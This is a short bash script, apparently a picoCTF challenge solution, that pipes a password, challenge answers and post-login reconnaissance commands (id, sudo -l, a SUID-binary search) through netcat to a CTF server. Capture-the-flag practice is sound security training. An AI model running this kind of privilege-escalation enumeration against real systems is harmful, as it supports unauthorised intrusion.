#!/bin/bash
(
echo "My_Passw@rd_@1234"
sleep 1
echo "DEFCON"
sleep 1
echo "John Draper"
sleep 2
echo "id"
sleep 1
echo "pwd"
sleep 1
echo "sudo -l"
sleep 1
echo "ls -la /"
sleep 1
echo "find / -perm -4000 2>/dev/null"
sleep 5
) | nc tethys.picoctf.net 59853
